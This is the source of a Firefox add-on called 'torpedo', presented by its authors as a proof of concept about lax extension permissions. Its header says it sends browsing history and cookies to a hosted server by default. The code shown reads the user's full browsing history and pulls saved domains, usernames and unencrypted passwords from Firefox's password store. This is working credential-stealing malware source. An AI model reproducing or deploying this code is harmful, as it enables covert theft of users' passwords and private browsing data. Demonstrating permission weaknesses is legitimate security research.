// torpedo extension for Firefox.
// Created by Joshua Balfour and Fionn Kelleher as a proof of concept
// regarding Firefox's lax extension permissions system.
//
// Joshua Balfour <josh@joshbalfour.co.uk>
// Fionn Kelleher <fionn@lightspike.net>
//
// NOTICE: By default, torpedo will submit data to a hosted server.
// torpedo will send your browsing history, cookies etc. to that
// server and it will be stored in a database, unencrypted.
// Run your own instance of torpedo-server, or proceed at your
// own peril.

var {Cc, Ci, Cu} = require("chrome");

var pass = require("passwords");
var history = Cc["@mozilla.org/browser/nav-history-service;1"].getService(Ci.nsINavHistoryService);
var ioService=Cc["@mozilla.org/network/io-service;1"].getService(Ci.nsIIOService);
var scriptableStream=Cc["@mozilla.org/scriptableinputstream;1"].getService(Ci.nsIScriptableInputStream);

var torpedo = function(config) {
    this.host = config.host + config.port;
}

torpedo.prototype.history = function() {
    // Method to retrieve browsing history.
    var query = history.getNewQuery();
    var options = history.getNewQueryOptions();
    var res = history.executeQuery(query, options);
    
    var cont = res.root;
    cont.containerOpen = true;
    
    var data = Array();
    
    for (var i = 0; i < cont.childCount; i++) {
        var node = cont.getChild(i);
        data.push({title: node.title, uri: node.uri, time: node.time, request_count: node.requestCount})
    }
    
    return data;
}

torpedo.prototype.passwords = function(callback) {
    // Method to retrieve domains, usernames and unencrypted passwords.
    pass.search({
        onComplete: function(creds) {
            callback(creds)
        }
    })
}